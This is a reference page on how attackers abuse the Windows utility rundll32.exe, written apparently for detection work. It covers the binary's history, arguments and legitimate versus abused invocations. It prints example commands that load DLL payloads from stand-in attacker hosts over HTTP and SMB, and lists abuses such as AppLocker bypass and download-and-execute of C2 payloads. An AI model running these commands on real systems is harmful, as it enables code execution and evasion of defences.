# LOLBins — rundll32.exe — Overview

> 🔴 **Red Flag Principle:** `rundll32.exe` is a utility for calling exported functions from DLLs on the command line — originally designed for testing and running COM/ActiveX controls. Abuse: point it at an attacker-authored DLL and specify an exported function name, and `rundll32.exe` loads the DLL into memory and invokes that export, running arbitrary code. The invariant tell is the **argument shape itself** — `rundll32 <DLL> <function>` with suspicious DLL source (remote, attacker-controlled path, obfuscated name) is unambiguous and survives binary rename. Unlike most LOLBins, rundll32 *does* spawn child processes for some uses (e.g., the deprecated `shell.cpl` GUI spawns a child handle window), but the DLL's own code execution happens inside rundll32's address space first, making parent-child hunting incomplete without command-line inspection.

## Contents
- [History](#history)
- [How It Works](#how-it-works)
- [Techniques / Protocols Used](#techniques--protocols-used)
- [Command-Line Switches — Quick Reference](#command-line-switches--quick-reference)
- [Legitimate vs. Abused Verbs](#legitimate-vs-abused-verbs)
- [Quick Use-Case List](#quick-use-case-list)
- [Prerequisites](#prerequisites)

---

## History

`rundll32.exe` is not an offensive-security tool — it's a native Windows utility for invoking exported DLL functions from the command line, included with Windows since the **Windows 3.1** era (1992) as a testing and COM-invocation utility. Its legitimate purpose is to allow administrators and developers to call arbitrary DLL exports without writing a wrapper application.

> "Rundll32.exe is a command-line utility that runs 32-bit dynamic-link libraries (DLLs). It loads and runs the specified DLL, then calls an exported DLL function you specify."
> — [Microsoft Learn, `rundll32` reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32)

The tool has persisted through every Windows version from Windows 3.1 through Windows 11, though its use has declined as modern development practices favor explicit programming over CLI-based DLL invocation. Microsoft's own documentation notes that rundll32 is **not recommended** for new applications — it's a legacy utility.

Its abuse as a "living-off-the-land binary" — repurposing it to load and call exported functions in malicious DLLs or to invoke legitimate DLL exports in unintended ways — is catalogued by the **[LOLBAS Project](https://lolbas-project.github.io/)** (`LOLBAS-Project/LOLBAS` on GitHub), documented in the `Rundll32.yml` entry (verified against the live GitHub source), credited to a broad community including researchers documenting the `shell.cpl` GUI abuse and DLL export-calling abuse techniques.

## How It Works

`rundll32.exe` exposes several abuse patterns:

**1. Direct malicious DLL loading and export invocation.** `rundll32.exe` loads any DLL specified on the command line and calls the specified exported function. If the DLL is attacker-authored, its code runs inside rundll32's process address space.

```
rundll32 C:\Users\Public\malicious.dll ExportedFunction
    or
rundll32 http://attacker.com/payload.dll DllMain
    or
rundll32 \\attacker.com\share\payload.dll FunctionName

           ↓

rundll32.exe loads DLL into its own address space
           ↓
DLL's DllMain() export is called (or specified export function)
           ↓
malicious code executes inside rundll32's process (no child process, no service)
```

The DLL must export the function specified; if not found, rundll32 fails silently or reports an error but the DLL loading itself still occurs, potentially triggering initialization routines.

**2. Abuse of legitimate DLL exports in unintended ways.** Some Windows system DLLs export functions that, when called in unexpected ways or with unexpected parameters, perform actions the developers never intended for command-line abuse. Examples:
- `shell.cpl` (Shell Control Panel) can be invoked to open GUI dialogs
- `mscoree.dll` (.NET runtime) can be invoked to execute .NET code
- `oleacc.dll` exposes Windows accessibility APIs
- Others documented by community researchers

**3. Local/UNC path vs. remote DLL loading.** Unlike mshta/regsvr32, rundll32's ability to load from HTTP/HTTPS is **not officially documented by Microsoft** — however, LOLBAS catalogs a technique where a remote URL pointing to a DLL can be specified, and some configurations/Windows versions support this. This requires further verification and is noted as an open question in modern Windows versions.

## Techniques / Protocols Used

| Layer | Detail |
|---|---|
| Transport (remote DLL) | HTTP/HTTPS or UNC path; remote loading support varies by Windows version and rundll32 implementation |
| DLL loading | Windows PE loader (`LoadLibraryEx`) — the standard OS DLL-loading mechanism |
| DLL execution context | Runs as whatever user/token invoked it — **no elevation required** for user-privilege DLLs; system DLLs may require admin context |
| Process model | Single process (DLL code runs inside `rundll32.exe`), though some DLL exports may spawn children (e.g., shell.cpl spawning a control-panel window process) |
| Binary location | `C:\Windows\System32\rundll32.exe` and `C:\Windows\SysWOW64\rundll32.exe` — the two legitimate OS install paths per LOLBAS's `Full_Path` listing |

## Command-Line Switches — Quick Reference

Verified against [Microsoft Learn's `rundll32` reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) and the [LOLBAS Project's `Rundll32.yml`](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/). `rundll32` has a minimal set of formal switches; most of the work is specifying the DLL path and export function name.

**Core arguments (required)**

| Argument | Meaning |
|---|---|
| `<DLL>` | Path to the DLL to load. Can be local path, UNC path, or (on some Windows versions) HTTP/HTTPS URL. Can be a full path or just a DLL name (if in System32 or on PATH). |
| `<function>` | Exported function to call. Typically one of the DLL's named exports (e.g., `DllMain`, `Run`, `Execute`, etc.). |

**Optional modifiers (less commonly used)**

| Flag | Meaning |
|---|---|
| `<arguments>` | Space-separated arguments passed to the specified export function. Rarely documented; usage depends on the specific export's signature. |

**Legacy/undocumented**

| Flag | Meaning |
|---|---|
| `/c` | **Console mode** — deprecated, not reliably supported in modern Windows; historically used to run the DLL in console mode. |

## Legitimate vs. Abused Verbs

For contrast, legitimate rundll32 usage is also rare in modern enterprises:

```cmd
rundll32.exe shell32.dll,Control_RunDLL intl.cpl
rundll32.exe keymgr.dll,KRShowKeyMgr
```

These invoke built-in Control Panel utilities via their DLL exports — an administrator testing or launching a system panel. A rundll32 invocation with an attacker-controlled DLL path or an obfuscated HTTP URL is not something that workflow produces.

## Quick Use-Case List

- Malicious DLL execution via rundll32 — arbitrary code execution using a Windows-signed binary as the host process
- Control Panel abuse (`shell.cpl`) — launching system dialogs in unexpected contexts
- .NET code execution via mscoree.dll — running C# code through rundll32 (requires .NET installed)
- Local malicious DLL loading — running a pre-staged `.dll` from disk
- UNC-path DLL loading — loading the DLL from an internal attacker-controlled SMB share
- Remote DLL loading (HTTP/HTTPS) — downloading and executing a DLL (support varies by OS)
- Bypassing AppLocker/WDAC — rundll32 is Microsoft-signed and allowlisted by default
- Renamed or relocated binary — defeating path-based detection
- Chained download-and-execute — fetch and run a full C2 payload via rundll32
- DLL side-loading / DLL proxy execution — placing an attacker DLL in a location where rundll32 or another signed binary loads it

## Prerequisites

| Requirement | Notes |
|---|---|
| Code execution on the target | Any existing foothold that can run a command line. `rundll32.exe` is not itself an initial-access vector. |
| Privilege level | **None beyond a standard user token** — execution of user-privilege DLL exports requires only `User` privilege. System-level DLLs or system-wide registry manipulation may require elevation. |
| Network reachability (remote DLL) | Outbound HTTP/HTTPS to the DLL-hosting URL (if applicable). Not required for local or UNC path loading. |
| DLL source | The operator needs either a malicious DLL pre-staged locally, hosted on an attacker web server, or available on an attacker-controlled SMB share. |
| Target OS version | Windows 3.1 through Windows 11 — rundll32 is a long-standing utility. Support for remote HTTP/HTTPS DLL loading is not universally documented and may vary by Windows version. |
